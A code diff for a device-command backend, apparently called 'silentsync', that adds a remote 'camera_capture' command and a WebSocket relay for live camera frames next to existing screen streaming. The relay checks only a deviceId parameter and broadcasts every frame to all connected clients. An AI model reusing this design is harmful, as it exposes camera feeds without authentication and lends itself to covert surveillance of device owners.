@@ -363,6 +363,23 @@ app.post("/api/command/:deviceId", async (req, res) => {
       return res.json({ success: true, streamUrl, commandId: commandRef.id });
     }
 
+    // Handle camera_capture command
+    if (type === "camera_capture") {
+      // Use WebSocket URL based on environment
+      const protocol = isWorker ? "wss" : "ws";
+      const host = isWorker
+        ? "silentsync-backend.onrender.com"
+        : `${req.headers.host}`;
+      const streamUrl = `${protocol}://${host}/camera-stream?deviceId=${deviceId}`;
+      commandData.payload = { streamUrl };
+      console.log(`[Command] Camera capture payload:`, commandData.payload);
+      console.log(
+        `[Command] Camera capture requested for ${deviceId}, streamUrl: ${streamUrl}`,
+      );
+      await commandRef.set(commandData);
+      return res.json({ success: true, streamUrl, commandId: commandRef.id });
+    }
+
     // Include message if provided (for display_message command)
     if (message) {
       commandData.message = message;
@@ -653,6 +670,9 @@ app.use(
 // WebSocket Server for Screen Streaming
 const screenStreams = new Map<string, Set<WebSocket>>();
 
+// WebSocket Server for Camera Streaming
+const cameraStreams = new Map<string, Set<WebSocket>>();
+
 // Start local server if not on Worker
 if (!isWorker) {
   const PORT = parseInt(process.env.PORT || "3000", 10);
@@ -683,7 +703,7 @@ if (!isWorker) {
 
       ws.on("message", (data: Buffer) => {
         // Broadcast screen frame to all clients watching this device
-        wss.clients.forEach((client) => {
+        wss.clients.forEach((client: WebSocket) => {
           if (client !== ws && client.readyState === WebSocket.OPEN) {
             client.send(data);
           }
@@ -698,6 +718,42 @@ if (!isWorker) {
 
       ws.on("error", (error: any) => {
         console.error(`[WebSocket] Error for device ${deviceId}:`, error);
+      });
+    } else {
+      ws.close();
+    }
+  });
+
+  // WebSocket Server for Camera Streaming
+  const cameraWss = new WebSocketServer({ server, path: "/camera-stream" });
+
+  cameraWss.on("connection", (ws: WebSocket, request: any) => {
+    const url = new URL(request.url || "", `http://${request.headers.host}`);
+    const deviceId = url.searchParams.get("deviceId");
+
+    if (deviceId) {
+      console.log(`[WebSocket] Camera stream connected for device ${deviceId}`);
+
+      ws.on("message", (data: Buffer) => {
+        // Broadcast camera frame to all clients watching this device
+        cameraWss.clients.forEach((client: WebSocket) => {
+          if (client !== ws && client.readyState === WebSocket.OPEN) {
+            client.send(data);
+          }
+        });
+      });
+
+      ws.on("close", () => {
+        console.log(
+          `[WebSocket] Camera stream disconnected for device ${deviceId}`,
+        );
+      });
+
+      ws.on("error", (error: any) => {
+        console.error(
+          `[WebSocket] Camera error for device ${deviceId}:`,
+          error,
+        );
       });
     } else {
       ws.close();
